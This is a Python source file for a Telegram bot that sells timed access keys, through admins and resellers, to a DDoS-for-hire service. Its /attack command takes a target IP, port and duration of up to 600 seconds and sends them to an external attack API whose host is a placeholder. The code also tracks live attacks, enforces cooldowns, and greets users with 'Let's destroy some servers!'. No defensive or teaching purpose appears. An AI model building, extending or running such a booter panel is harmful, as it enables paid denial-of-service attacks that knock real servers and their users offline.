#!/usr/bin/python3

import requests
import telebot
import datetime
import os
import time
import secrets
import threading
from datetime import timedelta
from threading import Timer
import pytz

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_IDS = {"7212246299"} # Ensure your ID is here

ATTACK_API_URL = "http://YOUR_API_DOMAIN_OR_IP/api/attack?ip={ip}&port={port}&time={time}"

USER_FILE        = "users.txt"
LOG_FILE         = "log.txt"
USER_ACCESS_FILE = "users_access.txt"
KEYS_FILE        = "keys.txt"
RESELLERS_FILE   = "resellers.txt"
BALANCE_FILE     = "balances.txt"
ALL_USERS_FILE   = "all_users.txt"

ist = pytz.timezone('Asia/Kolkata')

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY PLANS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KEY_PLANS = {
    "12hr":  {"duration": timedelta(hours=12), "cost": 30},
    "1day":  {"duration": timedelta(days=1),   "cost": 60},
    "3day":  {"duration": timedelta(days=3),   "cost": 180},
    "7day":  {"duration": timedelta(days=7),   "cost": 300},
    "30day": {"duration": timedelta(days=30),  "cost": 1000},
    "60day": {"duration": timedelta(days=60),  "cost": 1900},
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FILE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def read_all_users() -> set:
    try:
        with open(ALL_USERS_FILE, "r") as f:
            return {l.strip() for l in f if l.strip()}
    except FileNotFoundError:
        return set()

def save_all_users(users: set):
    with open(ALL_USERS_FILE, "w") as f:
        for uid in users:
            f.write(f"{uid}\n")

def read_users() -> list:
    try:
        with open(USER_FILE, "r") as f:
            return [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        return []

def save_users(users: list):
    with open(USER_FILE, "w") as f:
        for uid in users:
            f.write(f"{uid}\n")

def read_user_access() -> dict:
    data = {}
    try:
        with open(USER_ACCESS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, expiry = line.split(":", 1)
                    data[uid] = {"expiry_time": float(expiry)}
    except FileNotFoundError:
        pass
    return data

def save_user_access(data: dict):
    with open(USER_ACCESS_FILE, "w") as f:
        for uid, info in data.items():
            f.write(f"{uid}:{info['expiry_time']}\n")

def read_keys() -> dict:
    keys = {}
    try:
        with open(KEYS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    parts = line.split("|", 1)
                    keys[parts[0].strip()] = parts[1].strip()
    except FileNotFoundError:
        pass
    return keys

def save_keys(keys: dict):
    with open(KEYS_FILE, "w") as f:
        for key, plan in keys.items():
            f.write(f"{key}|{plan}\n")

def read_resellers() -> set:
    try:
        with open(RESELLERS_FILE, "r") as f:
            return {l.strip() for l in f if l.strip()}
    except FileNotFoundError:
        return set()

def save_resellers(resellers: set):
    with open(RESELLERS_FILE, "w") as f:
        for uid in resellers:
            f.write(f"{uid}\n")

def read_balances() -> dict:
    balances = {}
    try:
        with open(BALANCE_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, bal = line.split(":", 1)
                    try:
                        balances[uid.strip()] = int(bal.strip())
                    except ValueError:
                        balances[uid.strip()] = 0
    except FileNotFoundError:
        pass
    return balances

def save_balances(balances: dict):
    with open(BALANCE_FILE, "w") as f:
        for uid, bal in balances.items():
            f.write(f"{uid}:{bal}\n")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  STATE & COOLDOWN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
all_known_users: set   = read_all_users()
allowed_user_ids: list = read_users()
user_access: dict      = read_user_access()
active_keys: dict      = read_keys()
RESELLER_IDS: set      = read_resellers()
balances: dict         = read_balances()
bgmi_cooldown = {} 

# NEW: Track active attacks for the /status command
active_attacks = {} 

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def fmt_expiry(ts: float) -> str:
    return datetime.datetime.fromtimestamp(ts, tz=ist).strftime('%d %b %Y • %I:%M %p IST')

def generate_key() -> str:
    return "KEY-" + secrets.token_hex(10).upper()

def is_admin(uid: str) -> bool:
    return uid in ADMIN_IDS

def is_reseller(uid: str) -> bool:
    return uid in RESELLER_IDS

def is_admin_or_reseller(uid: str) -> bool:
    return is_admin(uid) or is_reseller(uid)

def get_balance(uid: str) -> int:
    return balances.get(uid, 0)

def log_action(user_id: str, action: str, message=None):
    if message and message.from_user.username:
        username = f"@{message.from_user.username}"
    else:
        username = f"ID:{user_id}"
        
    now = datetime.datetime.now(ist).strftime("%d-%m-%Y %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{now}] {username} | {action}\n")

def no_access_msg() -> str:
    return (
        "╔══════════════════════╗\n"
        "║   🚫  ACCESS DENIED   ║\n"
        "╚══════════════════════╝\n\n"
        "You don't have an active plan.\n"
        "Use /redeem <key> to activate access."
    )

def admin_only_msg() -> str:
    return "⛔  This command is restricted to admins only."

def admin_reseller_only_msg() -> str:
    return "⛔  This command is restricted to admins and resellers only."

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  EXPIRY MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def remove_expired_users():
    current_time = time.time()
    expired = [uid for uid, info in user_access.items() if info["expiry_time"] <= current_time]

    for uid in expired:
        try:
            bot.send_message(uid, "⏰ Your access plan has ended. Use /redeem with a new key to reactivate.")
        except Exception:
            pass
        user_access.pop(uid, None)
        if uid in allowed_user_ids:
            allowed_user_ids.remove(uid)

    if expired:
        save_users(allowed_user_ids)
        save_user_access(user_access)

    Timer(60, remove_expired_users).start()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HANDLERS — General
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    if user_id not in all_known_users:
        all_known_users.add(user_id)
        save_all_users(all_known_users)

    response = (
        "🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁</b> 🚀\n\n"
        "👑 <b>𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁</b>\n\n"
        "🎯 /attack [ip] [port] [time] - Start Attack\n"
        "📊 /status - Live Attack Status\n"
        "📦 /myplan - Check Your Plan\n"
        "❓ /help - Commands Menu\n\n"
        "🔥 <i>𝘓𝘦𝘵'𝘴 𝘥𝘦𝘴𝘵𝘳𝘰𝘺 𝘴𝘰𝘮𝘦 𝘴𝘦𝘳𝘃𝘦𝘳𝘴!</i>"
    )
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def show_help(message):
    bot.reply_to(message,
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "      📋  COMMANDS\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "  👤 USER COMMANDS\n"
        "  /start    → Welcome screen\n"
        "  /id       → Account info\n"
        "  /plan     → Plan expiry\n"
        "  /redeem   → Activate a key\n"
        "  /mylogs   → Your activity\n"
        "  /rules    → Usage rules\n"
        "  /status   → Bot status\n\n"
        "  🤝 RESELLER & ADMIN\n"
        "  /prices   → Key price list\n"
        "  /genkey   → Generate key\n"
        "  /listkeys → List unused keys\n"
        "  /deletekey→ Delete a key\n"
        "  /balance  → Check balance\n\n"
        "  🛠 ADMIN ONLY\n"
        "  /admincmd → View admin panel\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

@bot.message_handler(commands=['rules'])
def show_rules(message):
    bot.reply_to(message, "📜 RULES\n1. Do not share your key.\n2. One key = one account.\n3. Keys are non-refundable.\n4. Violations may result in ban.")

@bot.message_handler(commands=['prices'])
def show_prices(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        return bot.reply_to(message, admin_reseller_only_msg())

    lines = ["💰 KEY PRICE LIST\n"]
    for plan, info in KEY_PLANS.items():
        lines.append(f"  {plan.ljust(8)} - ₹{info['cost']}")
    lines.append("\nUse /genkey <plan> to generate")
    bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['id'])
def show_user_info(message):
    user_id  = str(message.chat.id)
    role = "Admin" if is_admin(user_id) else ("Reseller" if is_reseller(user_id) else "User")
    expiry_line = f"Expiry → {fmt_expiry(user_access[user_id]['expiry_time'])}" if user_id in user_access else "Expiry → No active plan"
    bal_line = f"\nBalance → ₹{get_balance(user_id)}" if is_reseller(user_id) else ""
    bot.reply_to(message, f"👤 ACCOUNT INFO\nID → {user_id}\nRole → {role}\n{expiry_line}{bal_line}")

@bot.message_handler(commands=['myplan', 'plan'])
def show_plan(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, no_access_msg())
    if user_id in user_access:
        bot.reply_to(message, f"📅 YOUR PLAN\nStatus → Active ✅\nExpires → {fmt_expiry(user_access[user_id]['expiry_time'])}")
    else:
        bot.reply_to(message, "⚠️ No expiry info found.")

@bot.message_handler(commands=['mylogs'])
def show_my_logs(message):
    user_id = str(message.chat.id)
    username_str = f"@{message.from_user.username}" if message.from_user.username else None
    
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, no_access_msg())
        
    try:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            
        user_logs = []
        for l in lines:
            if f"ID:{user_id}" in l or (username_str and username_str in l):
                user_logs.append(l.strip())
                
        if user_logs:
            recent_logs = "\n".join(user_logs[-15:])
            bot.reply_to(message, f"━━━━━━━━━━━━━━━━━━━━━━\n    📋  YOUR ACTIVITY\n━━━━━━━━━━━━━━━━━━━━━━\n\n{recent_logs}\n\n━━━━━━━━━━━━━━━━━━━━━━")
        else:
            bot.reply_to(message, "No activity found for your account.")
    except FileNotFoundError:
        bot.reply_to(message, "No logs found.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    
    if user_id not in all_known_users:
        all_known_users.add(user_id)
        save_all_users(all_known_users)

    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Usage: /redeem <key>")

    key = parts[1].strip().upper()
    if key not in active_keys: return bot.reply_to(message, "❌ INVALID KEY. It is either wrong or already used.")

    plan_label = active_keys[key]
    plan_info  = KEY_PLANS.get(plan_label)
    if not plan_info: return bot.reply_to(message, "❌ Unknown plan on this key. Contact admin.")

    now = datetime.datetime.now(ist)
    expiry_ts = (now + plan_info["duration"]).timestamp()

    if user_id not in allowed_user_ids:
        allowed_user_ids.append(user_id)
        with open(USER_FILE, "a") as f: f.write(f"{user_id}\n")

    user_access[user_id] = {"expiry_time": expiry_ts}
    save_user_access(user_access)

    del active_keys[key]
    save_keys(active_keys)

    log_action(user_id, f"Redeemed key | plan={plan_label}", message)
    bot.reply_to(message, f"✅ KEY ACTIVATED\nPlan → {plan_label}\nExpires → {fmt_expiry(expiry_ts)}")

@bot.message_handler(commands=['genkey'])
def gen_key(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg())

    parts = message.text.split()
    if len(parts) < 2 or parts[1] not in KEY_PLANS:
        return bot.reply_to(message, f"Usage: /genkey <plan>\nPlans: {', '.join(KEY_PLANS.keys())}")

    plan = parts[1]
    cost = KEY_PLANS[plan]["cost"]

    if is_reseller(user_id) and not is_admin(user_id):
        current_bal = get_balance(user_id)
        if current_bal < cost:
            return bot.reply_to(message, f"❌ INSUFFICIENT BALANCE.\nNeeded: ₹{cost}\nBalance: ₹{current_bal}")
        balances[user_id] = current_bal - cost
        save_balances(balances)

    key = generate_key()
    active_keys[key] = plan
    save_keys(active_keys)
    log_action(user_id, f"Generated key | plan={plan} | cost=₹{cost}", message)

    bot.reply_to(message, f"🔑 KEY GENERATED\nKey → <code>{key}</code>\nPlan → {plan}\nTap to copy.", parse_mode="HTML")

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg())
    if not active_keys: return bot.reply_to(message, "No unused keys available.")
    
    lines = ["🔑 UNUSED KEYS\n"]
    for k, plan in active_keys.items(): lines.append(f"  {k}  [{plan}]")
    bot.reply_to(message, "\n".join(lines)[:4000])

@bot.message_handler(commands=['deletekey'])
def delete_key(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg())
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Usage: /deletekey <key>")
    
    key = parts[1].strip().upper()
    if key in active_keys:
        del active_keys[key]
        save_keys(active_keys)
        bot.reply_to(message, f"✅ Key deleted.")
    else:
        bot.reply_to(message, "❌ Key not found.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BALANCE SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    
    parts = message.text.split()
    if len(parts) < 3: return bot.reply_to(message, "Usage: /addbalance <userId> <amount>")

    target = parts[1]
    try:
        amount = int(parts[2])
        if amount <= 0: raise ValueError
    except ValueError:
        return bot.reply_to(message, "❌ Amount must be a positive number.")

    if target not in RESELLER_IDS: return bot.reply_to(message, "❌ This user is not a reseller.")

    balances[target] = get_balance(target) + amount
    save_balances(balances)
    log_action(user_id, f"Added ₹{amount} balance to reseller={target}", message)
    bot.reply_to(message, f"✅ Added ₹{amount} to {target}. New Balance: ₹{get_balance(target)}")

@bot.message_handler(commands=['setbalance'])
def set_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    
    parts = message.text.split()
    if len(parts) < 3: return bot.reply_to(message, "Usage: /setbalance <userId> <amount>")

    target = parts[1]
    try:
        amount = int(parts[2])
        if amount < 0: raise ValueError
    except ValueError:
        return bot.reply_to(message, "❌ Amount must be 0 or more.")

    balances[target] = amount
    save_balances(balances)
    log_action(user_id, f"Set balance of reseller={target} to ₹{amount}", message)
    bot.reply_to(message, f"✅ Balance for {target} set to ₹{amount}.")

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    parts = message.text.split()
    
    if is_admin(user_id) and len(parts) > 1:
        target = parts[1]
        return bot.reply_to(message, f"💰 Reseller {target} Balance: ₹{get_balance(target)}")

    if is_reseller(user_id):
        return bot.reply_to(message, f"💰 Your Reseller Balance: ₹{get_balance(user_id)}")
        
    bot.reply_to(message, "❌ You are not a reseller. Only resellers have balances.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ADMIN & RESELLER MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    bot.reply_to(message,
        "🛠 ADMIN COMMANDS\n\n"
        "👤 USER MANAGEMENT\n"
        "/add <id> <plan>      Add user\n"
        "/remove <id>          Remove user\n"
        "/allusers             List users\n"
        "/extendall <num> <unit> Extend ALL users\n\n"
        "🤝 RESELLER\n"
        "/addreseller <id>     Add reseller\n"
        "/rmreseller <id>      Remove reseller\n"
        "/resellers            List resellers\n"
        "/addbalance <id> <₹>  Add balance\n"
        "/setbalance <id> <₹>  Set balance\n\n"
        "📢 BROADCASTING\n"
        "/broadcast <msg>      Send to EVERYONE\n"
        "/bcpaid <msg>         Send to PAID users\n"
        "/bcreseller <msg>     Send to RESELLERS\n\n"
        "📝 LOGS\n"
        "/logs                 Get log file\n"
        "/clearlogs            Wipe logs\n"
    )

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    parts = message.text.split()
    if len(parts) < 3 or parts[2] not in KEY_PLANS:
        return bot.reply_to(message, f"Usage: /add <userId> <plan>\nPlans: {', '.join(KEY_PLANS.keys())}")

    target = parts[1]
    plan = parts[2]
    expiry_ts = (datetime.datetime.now(ist) + KEY_PLANS[plan]["duration"]).timestamp()

    if target not in allowed_user_ids:
        allowed_user_ids.append(target)
        with open(USER_FILE, "a") as f: f.write(f"{target}\n")
        prefix = "✅ User added."
    else:
        prefix = "🔄 Access updated."

    user_access[target] = {"expiry_time": expiry_ts}
    save_user_access(user_access)
    
    if target not in all_known_users:
        all_known_users.add(target)
        save_all_users(all_known_users)

    log_action(user_id, f"Added user={target} plan={plan}", message)
    bot.reply_to(message, f"{prefix}\nID: {target}\nExpires: {fmt_expiry(expiry_ts)}")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Usage: /remove <userId>")
    
    target = parts[1]
    if target in allowed_user_ids:
        allowed_user_ids.remove(target)
        user_access.pop(target, None)
        save_users(allowed_user_ids)
        save_user_access(user_access)
        bot.reply_to(message, f"✅ User {target} removed.")
    else:
        bot.reply_to(message, "❌ User not found.")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    if not allowed_user_ids: return bot.reply_to(message, "No authorized users.")
    
    lines = ["👥 AUTHORIZED USERS\n"]
    for uid in allowed_user_ids:
        expiry_info = f" [{fmt_expiry(user_access[uid]['expiry_time'])}]" if uid in user_access else " [No expiry]"
        lines.append(f"ID: {uid}{expiry_info}")
    bot.reply_to(message, "\n".join(lines)[:4000])

@bot.message_handler(commands=['extendall'])
def extend_all(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    
    parts = message.text.split()
    if len(parts) < 3:
        return bot.reply_to(message, "Usage: /extendall <number> <hours/days>\nExample: /extendall 2 hours")
    
    try:
        amount = int(parts[1])
        unit = parts[2].lower()
    except ValueError:
        return bot.reply_to(message, "❌ Number must be an integer.")
        
    if "hour" in unit:
        time_to_add = timedelta(hours=amount)
        display_unit = f"{amount} hours"
    elif "day" in unit:
        time_to_add = timedelta(days=amount)
        display_unit = f"{amount} days"
    else:
        return bot.reply_to(message, "❌ Unit must be 'hours' or 'days'.")

    users_extended = 0
    current_time = time.time()
    
    for uid in list(user_access.keys()):
        # Only extend if they are currently active
        if user_access[uid]["expiry_time"] > current_time:
            # Add to their existing expiry time
            current_expiry_dt = datetime.datetime.fromtimestamp(user_access[uid]["expiry_time"])
            new_expiry_ts = (current_expiry_dt + time_to_add).timestamp()
            user_access[uid]["expiry_time"] = new_expiry_ts
            users_extended += 1
            
    save_user_access(user_access)
    log_action(user_id, f"Extended all keys by {display_unit}", message)
    
    success_msg = (
        f"🎉 <b>Time Extended for ALL Users!</b>\n\n"
        f"⏰ <b>Added:</b> {display_unit}\n"
        f"👥 <b>Users Updated:</b> {users_extended}\n\n"
        f"Enjoy!"
    )
    bot.reply_to(message, success_msg, parse_mode="HTML")


@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Usage: /addreseller <userId>")
    
    target = parts[1]
    RESELLER_IDS.add(target)
    save_resellers(RESELLER_IDS)
    if target not in balances:
        balances[target] = 0
        save_balances(balances)
    bot.reply_to(message, f"✅ Reseller {target} added with ₹0 balance.")

@bot.message_handler(commands=['rmreseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Usage: /rmreseller <userId>")
    
    target = parts[1]
    if target in RESELLER_IDS:
        RESELLER_IDS.discard(target)
        save_resellers(RESELLER_IDS)
        bot.reply_to(message, f"✅ Reseller {target} removed.")

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    if not RESELLER_IDS: return bot.reply_to(message, "No resellers found.")
    
    lines = ["🤝 RESELLERS\n"]
    for uid in RESELLER_IDS: lines.append(f"ID: {uid} → ₹{get_balance(uid)}")
    bot.reply_to(message, "\n".join(lines)[:4000])

@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_cmd(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    
    if os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()
        bot.reply_to(message, "✅ Logs cleared.")
    else:
        bot.reply_to(message, "No logs to clear.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  TARGETED BROADCASTING SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def execute_broadcast(sender_message, target_list, prefix_msg):
    parts = sender_message.text.split(maxsplit=1)
    if len(parts) < 2:
        return bot.reply_to(sender_message, f"Usage: {parts[0]} <message>")

    text = f"📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n\n{parts[1]}"
    success, fail = 0, 0
    
    for target in target_list:
        try:
            bot.send_message(target, text)
            success += 1
            time.sleep(0.1) # Telegram anti-spam limit
        except Exception:
            fail += 1

    bot.reply_to(sender_message, f"📢 {prefix_msg} Done\n✅ Sent: {success}\n❌ Failed: {fail}")

@bot.message_handler(commands=['broadcast'])
def broadcast_all(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    all_targets = list(all_known_users | set(allowed_user_ids) | RESELLER_IDS | ADMIN_IDS)
    execute_broadcast(message, all_targets, "Broadcast to ALL USERS")

@bot.message_handler(commands=['bcpaid'])
def broadcast_paid(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    execute_broadcast(message, allowed_user_ids, "Broadcast to PAID USERS")

@bot.message_handler(commands=['bcreseller'])
def broadcast_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
    execute_broadcast(message, list(RESELLER_IDS), "Broadcast to RESELLERS")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  API ATTACK SYSTEM WITH LIVE STATUS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def clean_up_attack(user_id):
    """Removes the attack from active_attacks when it finishes"""
    if user_id in active_attacks:
        del active_attacks[user_id]

def run_attack_api(chat_id, user_id, target, port, time_val):
    api_url = ATTACK_API_URL.format(ip=target, port=port, time=time_val)
    
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            # Wait for attack to finish
            time.sleep(time_val)
            bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
        else:
            bot.send_message(chat_id, f"⚠️ API Error: Server returned status {response.status_code}")
    except requests.exceptions.RequestException:
        bot.send_message(chat_id, f"❌ Failed to reach the attack API. It might be offline.")
    finally:
        # Always clean up the active attack list when done
        clean_up_attack(user_id)


@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, no_access_msg())

    if not is_admin(user_id):
        if user_id in bgmi_cooldown:
            time_passed = (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds()
            if time_passed < 60:
                return bot.reply_to(message, f"⏳ Cooldown! Wait {int(60 - time_passed)}s.")

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        try:
            port = int(command[2])
            time_val = int(command[3])
        except ValueError:
            return bot.reply_to(message, "❌ Port and Time must be numbers.")

        if time_val > 600:
            return bot.reply_to(message, "❌ Max time is 600s.")

        bgmi_cooldown[user_id] = datetime.datetime.now()
        
        # Save to active attacks for the /status command
        active_attacks[user_id] = {
            "target": f"{target}:{port}",
            "start_time": time.time(),
            "duration": time_val
        }
        
        log_action(user_id, f"Attack → IP: {target} | Port: {port} | Time: {time_val}s", message)
        
        # New formatted attack response
        attack_msg = (
            f"⚡Attack Start!\n\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Time: {time_val}s\n"
            f"⏳ Cooldown after attack: 60s\n\n"
            f"📊 /status se check kro..."
        )
        bot.reply_to(message, attack_msg)
        
        # Run API request in background
        threading.Thread(target=run_attack_api, args=(message.chat.id, user_id, target, port, time_val)).start()

    else:
        bot.reply_to(message, "✅ Usage: /attack [ip] [port] [time]")


@bot.message_handler(commands=['status'])
def attack_status(message):
    total_active = len(active_attacks)
    
    status_msg = (
        "╔══════════════════════════╗\n"
        "║  🔥 ATTACK 𝗦𝗧𝗔𝗧𝗨𝗦  🔥        ║\n"
        "╠══════════════════════════╣\n"
        f"║  📊 Total Active: {total_active}               ║\n"
        "╚══════════════════════════╝\n\n"
    )

    if total_active == 0:
        status_msg += "No active attacks right now."
    else:
        current_time = time.time()
        for uid, attack in active_attacks.items():
            elapsed = current_time - attack["start_time"]
            remaining = int(attack["duration"] - elapsed)
            
            # If for some reason it's stuck in the dictionary past duration
            if remaining <= 0:
                remaining = 0
                percent = 100
            else:
                percent = int((elapsed / attack["duration"]) * 100)
            
            # Generate Progress Bar (10 circles total)
            filled_circles = int(percent / 10)
            empty_circles = 10 - filled_circles
            progress_bar = ("🟢" * filled_circles) + ("⚫" * empty_circles)

            status_msg += (
                f"┌─────────────────────────┐\n"
                f"│ 🎯 {attack['target']}\n"
                f"│ ⏱️ {remaining}s remaining\n"
                f"│ {progress_bar} {percent}%\n"
                f"└─────────────────────────┘\n"
            )
            
    status_msg += "\n⚙️ Max Time: 600s"
    bot.reply_to(message, status_msg)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    remove_expired_users()
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print("   ✅  Bot is running perfectly with API")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)
